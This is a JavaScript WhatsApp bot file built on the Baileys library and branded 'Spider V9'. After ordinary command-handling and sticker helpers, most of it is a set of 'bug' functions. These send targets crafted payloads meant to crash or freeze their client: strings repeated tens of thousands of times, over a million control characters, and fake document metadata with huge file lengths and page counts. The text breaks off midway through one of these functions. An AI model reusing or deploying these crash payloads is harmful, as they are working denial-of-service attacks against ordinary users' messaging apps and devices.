// By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
const {
samConnect,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
//=====================================

//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const jimp = require("jimp")
const fetch = require("node-fetch")
const speed = require("performance-now")
const moment = require("moment-timezone")
const pino = require("pino")
const { spawn: spawn, exec } = require("child_process")
const { Primbon } = require("scrape-primbon")
const primbon = new Primbon()
const fg = require("api-dylux")
const path = require("path")
const cheerio = require("cheerio")
const ytdl = require("ytdl-core")
const chalk = require("chalk")
const { color } = require("./lib/color")
const FormData = require("form-data")
const crypto = require("crypto")
const yts = require("yt-search")
const bochil = require("@bochilteam/scraper")
const fakeUA = require("fake-useragent")
const randomUA = fakeUA().toString()
const fs = require("fs")
const fonts = require('./lib/fonts.js');
const menufont = require('./lib/menufonts.js');
const availableStyles = Object.keys(fonts);
const availableFontStyles = Object.keys(menufont);
module.exports = sam = handler = async (sam, m, chatUpdate, store) => {
try {
//==========≠=

//=================================================//
var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
//=================================================//
require("./media/config")
const {
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom
} = require("./lib/myfunction")
const { remini } = require("./lib/remini")
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime, TelegraPh } = require("./lib/uploader")
const { toTelegra } = require("./lib/upload")
//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ""
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User

//===================================
const botNumber = await sam.decodeJid(sam.user.id)
const itsMe = m.sender == botNumber ? true : false
const itsOrkay = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/premium.json'), 'utf8'))
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/owner.json'), 'utf8'))
const isCreator = [ botNumber, ...kontributor, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = [ botNumber, ...kontributor, ...itsOrkay, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./database/premium')
const orgkaya = JSON.parse(fs.readFileSync('./database/premium.json'))
const zetsQuoted = fs.readFileSync(`./media/spider.jpg`)
const testi  = fs.readFileSync(`./test.txt`)
const { make } = require('./test.js')
const { beta1, beta2, buk1 } = require("./lib/bug.js")
//==============================================°==//
//=================================================//
//Group
const groupMetadata = m.isGroup ? await sam.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
//=================================================//
const samido = fs.readFileSync(path.resolve(__dirname, './media/menu.mp3'))
const bugaudio = fs.readFileSync(path.resolve(__dirname, './media/bug.mp3'))
const spider = fs.readFileSync(path.resolve(__dirname, './media/spider.jpg'))
//=================================================//
const from = m.chat;
const fromMe = m.chat;
//
//=================================================//

if (!sam.public) {
    if (!isCreator) return
}

//sam.public = false
//=================================================//
async function exifAvatar(buffer, packname, author, categories = [''], extra = {}) {
    const {
        default: {
            Image
        }
    } = await import('node-webpmux')
    const img = new Image()
    const json = {
        'sticker-pack-id': 'parel-kntll',
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        'is-avatar-sticker': 1,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
function removeFiles() {
    const directoryPath = './session';
    const excludedFile = 'creds.json';

    fs.readdir(directoryPath, (err, files) => {
        if (err) {
            console.error(err);
            return;
        }

        files.forEach((file) => {
            if (file !== excludedFile) {
                const filePath = path.join(directoryPath, file);
                fs.unlink(filePath, (err) => {
                    if (err) {
                        console.error(err);
                    }
                });
            }
        });
    });
}
//=================================================//
async function addExif(webpSticker, packname, author, categories = [''], extra = {}) {
    const img = new webp.Image()
    const stickerPackId = Crypto.randomBytes(32).toString('hex')
    const json = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(webpSticker)
    img.exif = exif
    return await img.save(null)

}

try {
  const textLower = m.text.toLowerCase();

  if (textLower === 'send' || textLower === 'statusdown' || textLower === 'take') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;

    if (quotedMessage) {
      // Check if it's an image
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await
client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        client.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        reply('*Status Download Successful: by spider V1*');
      }

      // Check if it's a video
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        client.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        reply('*Status Download Successful: by spider V8*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}

//=================================================//
async function addExifAvatar(buffer, packname, author, categories = ["🥀"], extra = {}, ) {
    const {
        default: {
            Image
        },
    } = await import("node-webpmux")
    const img = new Image()
    const json = {
        "sticker-pack-id": "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
        emojis: categories,
        "is-ai-sticker": 1,
        "android-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        "ios-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        ...extra,
    }
    let exifAttr = Buffer.from([
        0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
        0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    ])
    let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8")
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}

    
 
//=================================================//
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//=================================================//
const reaction = async (jidss, emoji) => {
    sam.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
}

//=================================================//
async function aipong(target) {
await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 
async function XiosPay(jid) {
			sam.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.green("Send Bug By Spider-v9"));
		};
	async function XiosVirus(jid) {
			sam.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': ' ⿻SPIDER-V9 ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};
	
//=======≠============Bugs========================//
async function InVisiXz(target, spider, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "📌𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: spider
									},
									hasMediaAttachment: true
								},
								body: {
									text:  "⭑̤‏‎‏Holla Bro"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐒𝐚𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: VisiX
				}
			);

			await sam.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.green("Send Bug By Spider〽️"));
		};
		
				async function ClPmNull(target, Qrad, spider, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐏𝐫𝐞𝐥 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: spider
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐃𝐞𝐯𝐢𝐥 ⿻ 𝐒𝐩𝐢𝐝𝐞𝐫 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐒𝐚𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐒𝐩𝐢𝐝𝐞𝐫 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: Qrad
				}
			);

			await sam.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.green("Send Bug By Spider-V9〽️"));
		};

		async function StuckNull(target, spider, Ptcp = true) {
			await sam.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ 𝐊𝐈𝐍𝐆 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: spider,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑̊‏‎‏‎‏‎‏⭑̤\n" + "@254742491666".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6285655649546@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐒𝐏𝐈𝐃𝐄𝐑 𝐁𝐔𝐆 𝐕9〽️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By spider-v9〽️"));
		};
		
		
		const Qrad = {
			key: {
				remoteJid: 'p',
				from: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiX = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑⟆̊‏‎${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ 𝐃𝐄𝐕𝐈𝐋 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
		
async function ZnXIvS(target, Ptcp = true) {
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: ""
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " Spider〽️ "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: VisiXLoc
   });

   await sam.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug By Spider V9〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
